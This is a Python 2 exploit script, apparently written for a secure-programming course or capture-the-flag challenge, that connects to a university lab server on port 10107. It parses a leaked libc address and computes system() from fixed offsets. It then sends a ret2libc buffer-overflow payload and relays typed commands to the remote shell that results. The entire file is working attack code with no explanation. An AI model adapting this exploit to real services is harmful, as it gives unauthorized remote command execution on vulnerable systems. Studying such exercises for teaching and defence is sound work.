#!/usr/bin/python
import socket

SIZE = 1024

# connect
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('secprog.cs.nctu.edu.tw', 10107))
init_msg = c.recv(SIZE)

# get init msg
print init_msg
libc_address = int(init_msg[44:52], 16)
print 'address: ' + init_msg[44:52]

# send/recv
# binsh: 0x0804a02c
# 0003fc40 <__libc_system>:
# 00019970 <__libc_start_main>:
offset = int("0003fc40", 16) - int("00019970", 16)
system_address =  libc_address + offset
sa = hex(system_address).zfill(8)
print 'system_address: ' + sa
print sa[8:10] + "," + sa[6:8] + "," + sa[4:6] + "," + sa[2:4]
message = 'a' * 24
message += (chr(int(sa[8:10], 16)) + chr(int(sa[6:8], 16)) + chr(int(sa[4:6], 16)) + chr(int(sa[2:4], 16)))
message += ('a' * 4 + '\x20\x86\x04\x08\n')

c.send(message)

while 1:
    com = raw_input()
    c.send(com+'\n');
    print 's >> ' + com

    r = c.recv(SIZE)
    print 'r >> ' + r
    r = c.recv(SIZE)
    print 'r >> ' + r
    if not r:
        break

# close
c.close()
